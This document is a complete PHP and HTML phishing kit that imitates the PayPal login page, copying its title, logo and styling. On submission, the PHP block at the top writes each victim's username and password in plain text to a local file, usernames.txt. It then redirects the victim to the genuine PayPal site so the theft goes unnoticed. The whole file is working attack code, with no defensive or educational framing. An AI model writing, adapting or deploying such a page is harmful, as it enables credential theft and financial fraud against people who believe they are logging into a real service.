<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $data = "username: " . $_POST['username'] . " | password: " . $_POST['password'] . "\n";
    file_put_contents("usernames.txt", $data, FILE_APPEND);
    header("Location: https://www.paypal.com");
    exit;
}
?>
<!DOCTYPE html>
<html>
<head><title>PayPal – Log In</title><meta charset="UTF-8"></head>
<body style="background: #f7f9fa; font-family: Arial, sans-serif; text-align: center; margin-top: 80px;">
<div style="background: white; width: 400px; margin: auto; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
<img src="https://www.paypalobjects.com/webstatic/icon/pp/logo_pp_200x46.png" width="150"><br>
<h2>Log in to your account</h2>
<form method="post">
<input type="text" name="username" placeholder="Email or mobile number" style="width: 90%; padding: 14px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px;" required><br>
<input type="password" name="password" placeholder="Password" style="width: 90%; padding: 14px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px;" required><br>
<button type="submit" style="background: #0070ba; color: white; width: 95%; padding: 12px; border: none; border-radius: 25px; font-size: 16px;">Log In</button>
</form>
</div>
</body>
</html>
